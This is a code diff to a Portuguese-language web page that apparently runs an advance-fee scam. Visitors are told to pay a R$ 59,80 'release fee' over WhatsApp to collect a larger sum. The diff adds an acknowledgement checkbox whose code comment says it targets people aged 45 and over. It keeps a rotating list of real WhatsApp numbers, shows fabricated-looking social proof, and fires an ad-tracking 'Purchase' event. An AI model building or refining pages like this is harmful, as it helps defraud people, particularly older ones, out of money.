@@ -232,15 +232,23 @@
             </div>
 
             <!-- Vantagem / Ancoragem -->
-            <div class="bg-emerald-50 border-2 border-emerald-300 p-3 rounded-xl text-emerald-900 text-center shadow-inner mb-5">
+            <div class="bg-emerald-50 border-2 border-emerald-300 p-3 rounded-xl text-emerald-900 text-center shadow-inner mb-4">
                 <p class="text-[11px] font-bold text-emerald-800 uppercase tracking-wide">💡 Vantagem do Resgate</p>
                 <p class="text-xs mt-1">A taxa de liberação de <strong class="text-emerald-700 font-bold">R$ 59,80</strong> representa <strong>menos de 1%</strong> do valor total de <span id="valor-badge-taxa" class="font-mono font-bold text-emerald-700">R$ 0,00</span> que você vai resgatar!</p>
             </div>
 
-            <!-- Botão Pagar no WhatsApp com Rotação dos 5 Números -->
-            <a id="btn-whatsapp" href="#" onclick="clicarWhatsApp(event)" target="_blank"
-                class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-black py-4 rounded-xl transition duration-200 shadow-xl text-base flex items-center justify-center space-x-2 mb-5 cursor-pointer animate-pulse text-center no-underline">
-                <span>💬 Pagar Taxa no WhatsApp</span>
+            <!-- CHECKBOX DE CONFIRMAÇÃO (Foco no público 45+) -->
+            <div class="bg-blue-50 border-2 border-blue-200 rounded-xl p-3.5 mb-4 flex items-start space-x-3 text-left">
+                <input type="checkbox" id="check-ciente" onchange="alternarBotaoWhatsApp()" class="mt-1 w-5 h-5 accent-brand cursor-pointer flex-shrink-0">
+                <label for="check-ciente" class="text-xs text-slate-800 font-bold cursor-pointer leading-relaxed">
+                    Estou ciente de que serei atendido no WhatsApp para realizar o pagamento da taxa de emissão de <span class="text-brand font-black">R$ 59,80</span> e concluir meu saque hoje.
+                </label>
+            </div>
+
+            <!-- Botão Pagar no WhatsApp (Começa desativado/acinzentado até marcar a caixa) -->
+            <a id="link-whatsapp" href="#" onclick="clicarWhatsApp(event)" target="_blank"
+                class="w-full bg-slate-300 text-slate-500 font-black py-4 rounded-xl transition duration-200 shadow-sm text-base flex items-center justify-center space-x-2 mb-5 cursor-not-allowed text-center no-underline pointer-events-none">
+                <span>💬 Ir para o WhatsApp Pagar a Taxa</span>
             </a>
 
             <!-- Provas Sociais Dinâmicas -->
@@ -267,7 +275,6 @@
 
         // Lista com os 5 números configurados para rotação
         const listaWhatsapps = [
-            "5516982516678",
             "5516982192895",
             "5516982195327",
             "5511948594495",
@@ -515,7 +522,28 @@
             }, 1000);
         }
 
+        // Função que ativa/desativa o botão do WhatsApp dependendo do checkbox
+        function alternarBotaoWhatsApp() {
+            let marcado = document.getElementById('check-ciente').checked;
+            let botao = document.getElementById('link-whatsapp');
+
+            if (marcado) {
+                botao.classList.remove('bg-slate-300', 'text-slate-500', 'cursor-not-allowed', 'pointer-events-none');
+                botao.classList.add('bg-emerald-600', 'hover:bg-emerald-700', 'text-white', 'cursor-pointer', 'animate-pulse', 'shadow-xl');
+            } else {
+                botao.classList.add('bg-slate-300', 'text-slate-500', 'cursor-not-allowed', 'pointer-events-none');
+                botao.classList.remove('bg-emerald-600', 'hover:bg-emerald-700', 'text-white', 'cursor-pointer', 'animate-pulse', 'shadow-xl');
+            }
+        }
+
         function clicarWhatsApp(event) {
+            let marcado = document.getElementById('check-ciente').checked;
+            if (!marcado) {
+                event.preventDefault();
+                alert("Por favor, marque a caixa confirmando que está ciente da taxa para prosseguir.");
+                return;
+            }
+
             if (typeof fbq === 'function') {
                 fbq('track', 'Purchase');
             }
